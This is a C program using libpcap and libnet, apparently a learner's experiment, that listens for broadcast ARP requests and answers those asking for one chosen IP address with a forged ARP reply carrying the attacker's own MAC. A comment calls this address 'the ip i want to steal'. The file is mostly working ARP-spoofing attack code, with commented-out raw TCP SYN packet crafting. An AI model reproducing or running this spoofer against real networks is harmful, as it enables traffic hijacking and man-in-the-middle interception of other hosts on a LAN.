#include<stdio.h>
#include<stdlib.h>
#include<libnet.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<pcap.h>
#include<unistd.h>
#include<string.h>

#define uint32_t u_int32_t
#define uint16_t u_int16_t
#define uint8_t u_int8_t

#define ARP_DST_MAC(arp) ((((u_char*)&(((struct arp_entity*)arp)->src_ip))+2))
#define ARP_SRC_IP(arp) (*(struct in_addr*)(((u_char*)&(((struct arp_entity*)arp)->src_ip))-2))
#define ARP_DST_IP(arp) (*(struct in_addr*)(((u_char*)&(((struct arp_entity*)arp)->dst_ip))-4))


u_char i_mac[6] = {0x00,0x0c,0x29,0xe8,0xaf,0xb3};//vm mac addr
u_int16_t winwide = BUFSIZ-20;
u_int16_t dst_port = 8777;//remote port
libnet_ptag_t  tcp_op_ptag,ether_ptag,ip_ptag,tcp_ptag;
libnet_t *net_handle;
u_int32_t seq = 0;
u_int32_t ack = 0;

/******************arp*******************/
struct arp_entity{
	u_int16_t ht;//hard device type 1
	u_int16_t pt;//proto type 0x0800
	u_int8_t mac_l;//mac addr len 6
	u_int8_t ip_l;//4
	u_int16_t op;//ARPOP_REQUEST 1 ,ARPOP_REyingda 2
	u_int8_t src_mac[ETHER_ADDR_LEN];
//	u_int8_t src_mac_1;
//	u_int8_t src_mac_2;
//	u_int8_t src_mac_3;
//	u_int8_t src_mac_4;
//	u_int8_t src_mac_5;
	struct in_addr src_ip;
	u_int8_t dst_mac[ETHER_ADDR_LEN];
//	u_int8_t dst_mac_1;
//	u_int8_t dst_mac_2;
//	u_int8_t dst_mac_3;
//	u_int8_t dst_mac_4;
//	u_int8_t dst_mac_5;
	struct in_addr dst_ip;
}__attribute__((aligned(1)));
/****************************************/

struct ether_header{
	u_int8_t ether_dhost[ETHER_ADDR_LEN];
	u_int8_t ether_shost[ETHER_ADDR_LEN];
	u_int16_t ether_type;
};

#define IP_HL(ip) (((ip)->ip_vhl)&0x0f)
#define IP_V(ip) (((ip)->_vhl)>>4)

struct ip_header{
	u_int8_t ip_vhl;
	u_int8_t ip_tos;
	u_int16_t ip_len;
	u_int16_t ip_id;
	u_int16_t ip_off;

	u_int8_t ip_ttl;
	u_int8_t ip_p;

	u_int16_t ip_sum;
	struct in_addr ip_src,ip_dest;
};
#define TCP_HL(tcp) (((tcp)->th_offx2)>>4)
struct tcp_header{
	u_int16_t th_spost;
	u_int16_t th_dpost;
	u_int32_t th_seq;
	u_int32_t th_ack;
	u_int8_t th_offx2;
	u_int8_t th_flags;
	u_int16_t th_win;
	u_int16_t th_sum;
	u_int16_t th_urp;
};

#define ETHER_HEADER_LEN 14
void get_and_send(u_char* args , const struct pcap_pkthdr *header , const u_char* packet){
	struct ether_header *ether;
	struct ip_header *ip;
	struct tcp_header *tcp;
	struct arp_entity *arp;
	struct arp_entity send_arp;
	char *payload;
	/*toy_ip_str is the ip i want to steal*/
	char toy_ip_str[] = "192.168.116.22";
	u_int ip_header_l,tcp_header_l;
	bpf_u_int32 len = header->len;

	ether = (struct ether_header*)packet;
	if(ntohs(ether->ether_type)!=0x0806){
		printf("not arp proto\n");
		return;
	}
	//printf("ether addr :%u %u\n",ether->ether_dhost , ether->ether_shost);
	printf("arp\n");
//	arp = (u_char*)(packet + ETHER_HEADER_LEN);
	arp = (struct arp_entity*)(packet + ETHER_HEADER_LEN);
	//printf("device type :   %2x %2x\n",*(u_char*)arp,*(u_char*)(arp+1));
//	printf("proto  type :   %2x %2x\n",*(u_char*)(arp+2),*(u_char*)(arp+3));
//	printf("mac addr len:   %2x     \n",arp->mac_l);
//	printf("addr len???:%u %u %u %u %u %u %u %u %u %u\n",arp,&(arp->ht),&(arp->pt),&(arp->mac_l),&(arp->ip_l),&(arp->op),(arp->src_mac),&ARP_SRC_IP(arp),ARP_DST_MAC(arp),&ARP_DST_IP(arp));
//	printf("ip addr len :   %2x   \n",*(u_char*)(arp+5));
//	printf("option      :   %2x %2x\n",*(u_char*)(arp+6),*(u_char*)(arp+7));
//	printf("src mac     :   %2x:%2x:%2x:%2x:%2x:%2x\n",*(arp+8),*(arp+9),*(arp+10),*(arp+11),*(arp+12),*(arp+13));
//	printf("str ip      :   %2x.%2x.%2x.%2x\n",*(arp+14),*(arp+15),*(arp+16),*(arp+17));

//	printf("dst mac     :   %2x:%2x:%2x:%2x:%2x:%2x\n",*(arp+18),*(arp+19),*(arp+20),*(arp+21),*(arp+22),*(arp+23));
//printf("**************dst:%s src:%s\n",inet_ntoa(arp->dst_ip),inet_ntoa(arp->src_ip));
//	printf("****************dst:%s src:%s\n",inet_ntoa(ARP_DST_IP(arp)),inet_ntoa(ARP_SRC_IP(arp)));
//	printf("****************dst:%s src:%s\n",inet_ntoa(*(struct in_addr*)(((u_char*)&(arp->dst_ip))-4)),inet_ntoa(*(struct in_addr*)(((u_char*)&(arp->src_ip))-2)));
//	printf("str ip      :   %2x.%2x.%2x.%2x\n",*(arp+24),*(arp+25),*(arp+26),*(arp+27));
	if(!strcmp(inet_ntoa(ARP_DST_IP(arp)) , toy_ip_str)){
		printf("it is me! it is me\n");
		send_arp.ht = arp->ht;
		send_arp.pt = arp->pt;
		send_arp.mac_l = 6;
		send_arp.ip_l = 4;
		send_arp.op = htons(2);/****/
		memcpy(send_arp.src_mac ,i_mac,6);
		//send_arp.src_ip =arp->dst_ip;
		memcpy(&ARP_SRC_IP(&send_arp),&ARP_DST_IP(arp),4);
		memcpy(ARP_DST_MAC(&send_arp) ,arp->src_mac,6);
		memcpy(&ARP_DST_IP(&send_arp) ,&ARP_SRC_IP(arp),4);

		libnet_build_ethernet(
				ether->ether_shost,
				i_mac,
				ETHERTYPE_ARP,
				(u_char*)&send_arp,
				28,
				net_handle,
				0
				);//build ether
		libnet_write(net_handle);
	}

	/*ip = (struct ip_header*)(packet + ETHER_HEADER_LEN);
	ip_header_l = IP_HL(ip)*4;

	tcp = (struct tcp_header*)(packet + ETHER_HEADER_LEN + ip_header_l);
	tcp_header_l = TCP_HL(tcp)*4;

	payload = (char *)(packet + ETHER_HEADER_LEN + ip_header_l + tcp_header_l);

	
	if(ntohl(tcp->th_ack) ==(seq+1) && (tcp->th_flags & 0x12)==0x12){//syn and ack
		printf("get hand success\n");
		seq++;
		ack = ntohl(tcp->th_seq)+1;
		tcp_op_ptag = libnet_build_tcp_options(NULL,0,net_handle , tcp_op_ptag);
		tcp_ptag = libnet_build_tcp(
				8888,
				dst_port,
				seq,
				ack,
				TH_ACK,
				winwide,
				0,
				0,
				LIBNET_TCP_H,
				NULL,
				0,
				net_handle,
				tcp_ptag
				);
		libnet_write(net_handle);
	}else if(ntohl(tcp->th_ack) ==(seq+1)&& (tcp->th_flags& 0x12)!=0x12){
		printf("fail link tcp ack: %u\n",ntohl(tcp->th_ack));
	
	}else{
		printf("else ack: %u\n",ntohl(tcp->th_ack));
		if((u_int)len-ETHER_HEADER_LEN-ip_header_l-tcp_header_l){
			printf("payload:%s\n",packet - (u_int)len-ETHER_HEADER_LEN - ip_header_l - tcp_header_l);
		}
	}
	*/
	return;
	

}


int main(){
	char compile_str[]="ether dst ff:ff:ff:ff:ff:ff";
	bpf_program com_fil;

	char device[] = "eth0";
	char pcap_err[PCAP_ERRBUF_SIZE],net_err[LIBNET_ERRBUF_SIZE];
	pcap_t *pcap_handle;
//	u_char dst_mac[6] = {0x00,0x50,0x56,0xfa,0x00,0x9d};//suzhu mac addr
//	u_char src_mac[6] = {0x00,0x0c,0x29,0xe8,0xaf,0xb3};//vm mac addr

//	char src_ip_str[] = "192.168.116.129";//vm local ip addr
//	char src_ip_str[] = "192.168.116.128";//not real me
//	char dst_ip_str[] = "107.182.184.231";//remote ip addr


//	u_char payload[70];
//	u_int32_t payload_s=0;

//	u_int32_t src_ip,dst_ip;
//	src_ip = libnet_name2addr4(net_handle , src_ip_str , LIBNET_RESOLVE);
//	dst_ip = libnet_name2addr4(net_handle , dst_ip_str , LIBNET_RESOLVE);

	net_handle = libnet_init(LIBNET_LINK , device , net_err);

	/*
	 *device : device name
	 *max packet len must less than 65535
	 *promise: set to 1 means hunza...
	 *to_ms: overtime ,set to 0 means wait till a packet come
	 */
	pcap_handle = pcap_open_live(device , BUFSIZ , 1,0,pcap_err);
	


	if(pcap_handle==NULL || net_handle==NULL){
		fprintf(stderr ,"Fail to init libnet or open pcap \n");
		return -1;
	}
	/*********compile here*********/
	pcap_compile(pcap_handle , &com_fil , compile_str,0,PCAP_NETMASK_UNKNOWN);
	pcap_setfilter(pcap_handle , &com_fil);



	/**/
/*	int l=0;
	payload[l++] = 0x02;
	payload[l++] = 0x04;
	payload[l++] = 0x05;
	payload[l++] = 0xb4;
	payload[l++] = 0x04;
	
	payload[l++] = 0x02;
	payload[l++] = 0x08;
	payload[l++] = 0x0a;
	payload[l++] = 0x1b;
	payload[l++] = 0x98;
	
	payload[l++] = 0x77;
	payload[l++] = 0x24;
	payload[l++] = 0x00;
	payload[l++] = 0x00;
	payload[l++] = 0x00;
	
	payload[l++] = 0x00;
	payload[l++] = 0x01;
	payload[l++] = 0x03;
	payload[l++] = 0x03;
	payload[l++] = 0x07;
*/
	/**/
/*	tcp_op_ptag = libnet_build_tcp_options(
			payload,
			20,
			net_handle,
			0
			);
	if(tcp_op_ptag==-1){
		printf("Fail at build tcp options\n");
		return -1;
	}
	tcp_ptag = libnet_build_tcp(
			8888,//src port
			dst_port,
			seq,//seq#
			ack,//ack#
			TH_PUSH|TH_SYN,
			winwide,
			0,//checksum
			0,
			20+LIBNET_TCP_H,//len
			NULL,//payload
			0,
			net_handle,
			0
			);
	if(tcp_ptag==-1){
		printf("Fail at build tcp\n");
		return -1;
	}

	ip_ptag = libnet_build_ipv4(
			LIBNET_IPV4_H + LIBNET_TCP_H + 20,//len
			0,//type-of-server useless
			(u_int16_t)libnet_get_prand(LIBNET_PRu16),//id
			0x4000,//flags??
			64,//ttl
			IPPROTO_TCP,
			0,//CHECKSUM
			src_ip,
			dst_ip,
			NULL,
			0,
			net_handle,
			0
			);

	if(ip_ptag==-1){
		printf("Fail at build ipv4\n");
		return -1;
	}

	ether_ptag = libnet_build_ethernet(
			dst_mac,
			src_mac,
			ETHERTYPE_IP,
			NULL,
			0,
			net_handle,
			0
			);
	if(ether_ptag==-1){
		printf("fail at build ethernet\n");
		return -1;
	}


	libnet_write(net_handle);*/
	pcap_loop(pcap_handle ,-1, get_and_send,NULL);

	return 0;
}


